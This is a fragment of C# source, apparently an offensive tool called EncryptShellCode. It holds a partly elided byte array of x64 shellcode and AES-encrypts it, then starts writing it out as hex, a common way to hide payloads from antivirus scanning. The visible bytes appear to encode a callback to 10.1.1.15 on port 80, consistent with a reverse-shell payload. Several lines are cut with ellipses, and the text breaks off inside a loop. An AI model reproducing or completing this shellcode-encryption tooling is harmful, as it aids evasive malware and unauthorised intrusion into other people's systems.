...
namespace EncryptShellCode
{
        class Program
        {
                static void Main(string[] args)
                {
                    ...
                    byte[] shell = new byte[] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
...
0x49,0xbc,0x02,0x00,0x00,0x50,0x0a,0x01,0x01,0x0f,0x41,0x54,0x49,0x89,0xe4,
...
0xd5};
                    ...
                    byte[] encodedshell = AESEncryptShellcode(shell,Key,IV);

                    StringBuilder hexcodes = new StringBuilder(encodedshell.Length * 2);
                    foreach (byte b in encodedshell)
                    {
